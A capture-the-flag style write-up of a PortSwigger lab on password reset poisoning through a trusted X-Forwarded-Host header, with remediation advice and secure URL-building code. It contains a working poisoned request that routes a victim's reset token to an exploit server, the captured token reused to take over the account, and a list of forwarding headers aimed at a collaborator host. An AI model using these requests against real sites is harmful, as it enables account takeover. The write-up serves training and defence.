# PortSwigger Lab: Password Reset Poisoning via Middleware

**Author:** Neelesh Pandey  
**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Practitioner  
**Category:** Authentication / Password Reset Poisoning  
**Lab:** Password reset poisoning via middleware  

---

## Overview

This lab demonstrates **password reset poisoning via the X-Forwarded-Host header**. The application generates password reset URLs dynamically using the host from the incoming request. By injecting the `X-Forwarded-Host` header pointing to an attacker-controlled server, the reset email sent to the victim contains a link to the attacker's domain — causing the victim's valid reset token to be delivered directly to the attacker when clicked.

---

## The Vulnerability

The application generates the password reset URL using the host value from the request. Behind a proxy or load balancer, the `X-Forwarded-Host` header is trusted to indicate the original client's intended host.

```
Normal flow:
POST /forgot-password (Host: real-site.com)
→ Email: https://real-site.com/reset?token=abc123

Poisoned flow:
POST /forgot-password (X-Forwarded-Host: evil.com)
→ Email: https://evil.com/reset?token=abc123
```

The victim receives a legitimate-looking email but the reset link points to the attacker's server. When Carlos clicks the link, his valid token is sent to the attacker.

---

## Methodology

```
Confirm X-Forwarded-Host supported → inject exploit server URL →
Submit reset for carlos → capture token from exploit server logs →
Use token on real site → reset carlos's password → login
```

---

## 1. Reconnaissance

### Step 1 — Investigate Normal Reset Flow

Submitted a password reset for own account (`wiener`). Captured `POST /forgot-password` in Burp Proxy. Received email with reset link:

```
https://real-site.com/forgot-password?temp-forgot-password-token=<token>
```

Confirmed the domain in the reset URL matches the Host header — the URL is dynamically generated from request headers.

### Step 2 — Test X-Forwarded-Host Support

Sent `POST /forgot-password` to Burp Repeater. Added the header:

```http
X-Forwarded-Host: test.com
```

Checked the reset email — the link domain changed to `test.com`. **X-Forwarded-Host confirmed trusted for URL generation.**

---

## 2. Exploitation

### Step 1 — Prepare Poisoned Request

Added exploit server URL as `X-Forwarded-Host` and changed username to `carlos`:

```http
POST /forgot-password HTTP/2
Host: <lab-id>.web-security-academy.net
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=carlos
```

### Step 2 — Send Request

Sent from Burp Repeater. The server:
1. Validated that `carlos` exists
2. Generated a reset token for Carlos's account
3. Sent Carlos an email with the poisoned URL:

```
https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/forgot-password?temp-forgot-password-token=<carlos-token>
```

### Step 3 — Capture Token from Exploit Server

Carlos clicked the link (as described in lab — he clicks any link he receives).

Opened exploit server → Access log:

```
GET /forgot-password?temp-forgot-password-token=nb7rvOaFATq1hd0wdGBJ0QyYYnFSb4t1 HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

**Carlos's valid reset token captured:** `nb7rvOaFATq1hd0wdGBJ0QyYYnFSb4t1`

### Step 4 — Use Token on Real Site

Opened own reset email (wiener's) — copied the real reset URL structure:

```
https://<lab-id>.web-security-academy.net/forgot-password?temp-forgot-password-token=<wiener-token>
```

Replaced wiener's token with Carlos's stolen token:

```
https://<lab-id>.web-security-academy.net/forgot-password?temp-forgot-password-token=nb7rvOaFATq1hd0wdGBJ0QyYYnFSb4t1
```

Loaded this URL → password reset form for Carlos's account appeared → set new password.

### Step 5 — Login as Carlos

Logged in with Carlos's new password → lab solved.

---

## 3. Attack Flow Summary

```
POST /forgot-password
X-Forwarded-Host: exploit-server.net
username=carlos
        ↓
Server generates token for carlos → sends email with poisoned URL:
https://exploit-server.net/reset?token=nb7rvOaFATq1hd0wdGBJ0QyYYnFSb4t1
        ↓
Carlos clicks link → token sent to exploit server logs
        ↓
Attacker captures token → uses on real site:
https://real-site.com/reset?token=nb7rvOaFATq1hd0wdGBJ0QyYYnFSb4t1
        ↓
Reset Carlos's password → login → lab solved
```

---

## 4. Why X-Forwarded-Host is Trusted

Load balancers and reverse proxies set `X-Forwarded-Host` to pass the original client's requested host to backend servers. Many frameworks use this header to generate absolute URLs — password reset links, email confirmation links, canonical URLs.

**The flaw:** The application trusts this header from any source, not just from known trusted proxy IPs. An attacker can set it to any value in their request.

**Safe approach:** Only trust `X-Forwarded-Host` if the request comes from a known, trusted infrastructure IP. Never use it from arbitrary clients.

---

## 5. Comparison — Password Reset Poisoning Variants

| Variant | Header Used | Difficulty | When it Works |
|---------|------------|------------|---------------|
| Basic Host header | `Host` | Apprentice | No proxy validation |
| Via middleware | `X-Forwarded-Host` | Practitioner | App behind proxy, trusts this header |
| Dangling markup | HTML injection via Host | Expert | Header changes blocked, HTML injection possible |

This lab is the **Practitioner** variant — the direct Host header change is blocked but `X-Forwarded-Host` is trusted by the middleware layer.

---

## 6. Key Takeaways

- **X-Forwarded-Host is as dangerous as Host for URL generation** — if the application uses it to build links, it should only be trusted from known proxy IPs
- **Password reset tokens are single-use high-value credentials** — stealing one token grants complete account access without needing the password
- **Dynamic URL generation from request headers is a common vulnerability class** — applies to reset links, confirmation emails, OAuth redirects, canonical URLs
- **The victim's token is valid on the real site** — the poisoned email doesn't change the token itself, only the domain — the token still works on the legitimate website
- **Access logs are the attack channel** — the token arrives as a URL query parameter visible in the exploit server's HTTP access log
- **Always test X-Forwarded-Host when Host header is blocked** — many applications validate the Host header but forget about proxy forwarding headers

---

## 7. Real-World Relevance

Password reset poisoning via middleware headers appears when:
- Applications sit behind load balancers or reverse proxies (nginx, Apache, AWS ALB)
- The framework uses `X-Forwarded-Host` or similar headers to build absolute URLs
- The header is not restricted to trusted proxy IP ranges

In bug bounty, always test password reset flows with:
```http
X-Forwarded-Host: your-collaborator.burpcollaborator.net
X-Host: your-collaborator.burpcollaborator.net
X-Forwarded-Server: your-collaborator.burpcollaborator.net
Forwarded: host=your-collaborator.burpcollaborator.net
```

If any of these cause a DNS lookup or HTTP request to your server — the vulnerability exists.

---

## 8. Remediation

| Finding | Risk | Fix |
|---------|------|-----|
| X-Forwarded-Host trusted for URL generation | Critical | Only trust proxy headers from known infrastructure IPs — whitelist trusted proxy addresses |
| Reset URL domain from request header | Critical | Hardcode the application's domain in URL generation — never use request headers |
| Token valid after delivery to wrong host | High | Invalidate token if the reset URL was accessed from an unexpected domain |
| No token binding to session/IP | Medium | Optionally bind tokens to requesting IP to reduce cross-origin theft risk |

**Secure URL generation:**
```python
# WRONG — uses request header
reset_url = f"https://{request.headers['X-Forwarded-Host']}/reset?token={token}"

# CORRECT — hardcoded domain
reset_url = f"https://real-site.com/reset?token={token}"

# OR — use configured domain from server config
reset_url = f"https://{settings.BASE_URL}/reset?token={token}"
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite | Proxy, request interception |
| Burp Repeater | Manual header injection and request modification |
| Exploit server | Receiving stolen reset token via access log |

---

## References

- [PortSwigger — Password Reset Poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)
- [PortSwigger — HTTP Host Header Attacks](https://portswigger.net/web-security/host-header)
- [OWASP — Testing for Password Reset](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities)

---

*Write-up by Neelesh Pandey — [GitHub](https://github.com/Neelesh707) | [LinkedIn](https://www.linkedin.com/in/neelesh-pandey021/)*
